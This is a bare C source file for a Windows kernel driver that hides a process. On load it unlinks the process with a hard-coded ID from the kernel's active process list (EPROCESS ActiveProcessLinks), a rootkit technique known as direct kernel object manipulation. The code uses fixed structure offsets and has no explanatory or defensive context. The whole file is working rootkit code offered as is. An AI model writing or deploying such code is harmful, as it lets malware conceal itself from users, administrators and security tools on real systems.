#include <ntifs.h>

NTSTATUS HideProcess(ULONG ulPid)
{
	PEPROCESS pExprocess = NULL;
	ULONG ulProcessID = 0;

	pExprocess = PsGetCurrentProcess();

	PLIST_ENTRY pActiveProcessLinks = (LIST_ENTRY*)((ULONG)pExprocess + 0xb8);
	PLIST_ENTRY pNextLinks = pActiveProcessLinks->Flink;
	while (pNextLinks->Flink != pActiveProcessLinks->Flink)
	{
		pExprocess = (ULONG)pNextLinks - 0xb8;
		ulProcessID = *((ULONG*)((ULONG)pExprocess + 0xb4));
		if (ulProcessID == ulPid)
		{
			pNextLinks->Blink->Flink = pNextLinks->Flink;
			pNextLinks->Flink->Blink = pNextLinks->Blink;
		}
		pNextLinks = pNextLinks->Flink;
	}
	return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("Driver Unload Success!");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)
{
	DbgPrint("Driver Load Success!");
	HideProcess(3348);
	pDriverObject->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}